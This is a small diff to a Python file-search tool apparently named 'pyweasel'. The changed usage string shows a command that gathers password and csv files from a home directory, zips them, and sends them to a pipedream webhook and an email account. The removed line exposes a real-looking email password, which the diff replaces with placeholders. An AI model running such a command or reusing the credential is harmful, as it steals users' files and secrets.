@@ -133,7 +133,7 @@ if __name__ == '__main__':
     start_time = datetime.datetime.now()
 
     parser = argparse.ArgumentParser(description='Search files on computer',
-                                     usage='./pyweasel.bin --url=https://your_workflow.m.pipedream.net --input-file=lin_list.txt --search_files=password.txt,csv --path=\"/home/user/\" --interactive=True --email=pyweasel@gmail.com --password=Mrdzn1QARtj019ARtWLU --zip=True')
+                                     usage='./pyweasel.bin --url=https://your_workflow.m.pipedream.net --input-file=lin_list.txt --search_files=password.txt,csv --path=\"/home/user/\" --interactive=True --email="xxxx@gmail.com" --password="password" --zip=True')
     parser.add_argument('--url', dest='url', help='url parameter for http server')
     parser.add_argument('--input-file', dest='input_file',
                         help='file with the list of files or extension to search')
